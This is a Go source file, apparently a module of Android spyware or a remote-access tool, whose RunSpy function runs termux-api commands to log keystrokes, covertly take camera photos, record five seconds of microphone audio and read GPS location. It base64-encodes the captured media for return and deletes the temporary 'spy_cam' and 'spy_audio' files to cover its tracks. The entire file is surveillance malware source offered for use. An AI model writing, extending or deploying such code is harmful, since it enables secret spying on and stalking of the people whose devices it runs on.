package modules

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

func RunSpy(params map[string]interface{}) map[string]interface{} {
	res := make(map[string]interface{})
	action, _ := params["action"].(string)

	switch action {
	case "keylog":
		res["keylog"] = captureKeylog()
	case "camera":
		res["camera"] = captureCamera()
	case "mic":
		res["mic"] = recordMic()
	case "location":
		res["location"] = getLocation()
	default:
		// Run all
		res["keylog"] = captureKeylog()
		res["camera"] = captureCamera()
		res["mic"] = recordMic()
		res["location"] = getLocation()
	}
	return res
}

// captureKeylog – uses termux-api to get key events (requires termux-api)
func captureKeylog() string {
	// termux-keyboard can log keys, but we'll simulate with a simple approach:
	// We can read from /dev/input/event* (requires root), so we use termux-api.
	// This only works if termux-api is installed and permissions granted.
	out, err := exec.Command("termux-keyboard", "--log").CombinedOutput()
	if err != nil {
		return fmt.Sprintf("keylog error: %v", err)
	}
	return string(out)
}

// captureCamera – take a photo using termux-camera-photo
func captureCamera() string {
	path := "/sdcard/spy_cam_" + time.Now().Format("20060102150405") + ".jpg"
	cmd := exec.Command("termux-camera-photo", "-c", "0", path)
	if err := cmd.Run(); err != nil {
		return fmt.Sprintf("camera error: %v", err)
	}
	// Read and base64 encode the image
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf("camera read error: %v", err)
	}
	os.Remove(path) // clean up
	return base64.StdEncoding.EncodeToString(data)
}

// recordMic – record audio using termux-microphone-record
func recordMic() string {
	file := "/sdcard/spy_audio_" + time.Now().Format("20060102150405") + ".aac"
	// Start recording in background (we need to set duration)
	// termux-microphone-record can record for a set duration
	cmd := exec.Command("termux-microphone-record", "-f", file, "-l", "5", "-r") // 5 seconds
	if err := cmd.Run(); err != nil {
		return fmt.Sprintf("mic error: %v", err)
	}
	// Read and base64 encode
	data, err := os.ReadFile(file)
	if err != nil {
		return fmt.Sprintf("mic read error: %v", err)
	}
	os.Remove(file)
	return base64.StdEncoding.EncodeToString(data)
}

// getLocation – use termux-location
func getLocation() string {
	out, err := exec.Command("termux-location").CombinedOutput()
	if err != nil {
		return fmt.Sprintf("location error: %v", err)
	}
	return string(out)
}